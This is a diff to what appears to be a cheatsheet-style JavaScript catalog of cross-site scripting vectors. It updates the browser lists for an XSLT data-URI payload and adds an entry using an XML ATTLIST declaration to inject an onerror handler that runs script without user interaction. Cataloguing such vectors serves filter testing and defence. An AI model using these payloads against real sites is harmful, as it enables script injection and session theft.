@@ -2062,10 +2062,10 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'chrome': ['4.x'],
-            'safari': ['4.x'],
-			'firefox': ['3.x'],
-			'opera': ['10.x']
+            'chrome': ['4.x', '5.x'],
+            'safari': ['3.4', '4.x'],
+			'firefox': ['3.0', '3.5', '3.6', '3.7'],
+			'opera': ['9.x', '10.x']
         },
         'tags'       : ['xss', 'svg', 'onload','chrome','firefox','safari','opera'],
         'reporter'   : 'gareth'
@@ -2081,7 +2081,7 @@ var items =
         },
         'data'       : '<?xml version="1.0"?>\n<?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version=\'1.0\' xmlns:xsl=\'http://www.w3.org/1999/XSL/Transform\' id=\'xss\'%3E%3Cxsl:output method=\'html\'/%3E%3Cxsl:template match=\'/\'%3E%3Cscript%3E%js_alert%%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?>\n<html></html>',
         'description': {
-	    'en' : 'Opera support xml-stylesheet via data URIs. There are many ways to execute javascript using the XSL (XSLT). If you put this code in an external file on the same domain, then it will work in all browsers. It is also possible appeal to the code of the stylesheet by id (href = "# xss"), when the stylesheet implemented in the current document.',
+            'en' : 'Opera support xml-stylesheet via data URIs. There are many ways to execute javascript using the XSL (XSLT). If you put this code in an external file on the same domain, then it will work in all browsers. It is also possible appeal to the code of the stylesheet by id (href = "# xss"), when the stylesheet implemented in the current document.',
             'ja' : '',
             'ru' : 'Opera поддерживает загрузку xml-таблицы стилей с помощью data-схемы. Существует очень много способов выполнить javascript, используя XSL (XSLT). Если вы разместите приведенный код таблицы стилей во внешнем файле, расположенном на том же домене, то он cработает во всех браузерах. Допустимо также обращение к коду таблицы стилей посредством ид (href="#xss"), если таблица стилей внедрена в текущий документ.',
             'de' : ''
@@ -2100,5 +2100,37 @@ var items =
         },
         'tags'       : ['xss', 'javascript', 'opera', 'xslt', 'xsl', 'stylesheet', 'xml'],
         'reporter'   : 'LeverOne'
+    },
+    { /* ID 67 - XML ATTLIST declaration causing JavaScript execution */
+        'id'         : 67,
+        'category'   : 'xml', 
+        'name'       : {
+            'en' : 'XML ATTLIST declaration causing JavaScript execution',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'data'       : '<!DOCTYPE x [<!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "x" onerror CDATA "alert(1)">]><img /',
+        'description': {
+            'en' : 'XML ATTLIST declarations can be used to create attributes and assign values for the following tags inside the DOCTYPE declaration. By chosing the right namespace and attribute combinations it\'s possible to create an ATTLIST declaration causing JavaScript execution without user interaction.', 
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'urls'    : ['http://xmlwriter.net/xml_guide/attlist_declaration.shtml'],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'chrome': ['4.x', '5.x'],
+            'safari': ['3.4', '4.x'],
+            'firefox': ['3.0', '3.5', '3.6', '3.7'],        
+            'opera': ['8.0', '9.0', '10.0', '10.5', 'mobile']
+        },
+        'tags'       : ['xss', 'javascript', 'opera', 'attlist', 'doctype', 'chrome', 'firefox', 'safari'],
+        'reporter'   : 'mario'
     }
 ]
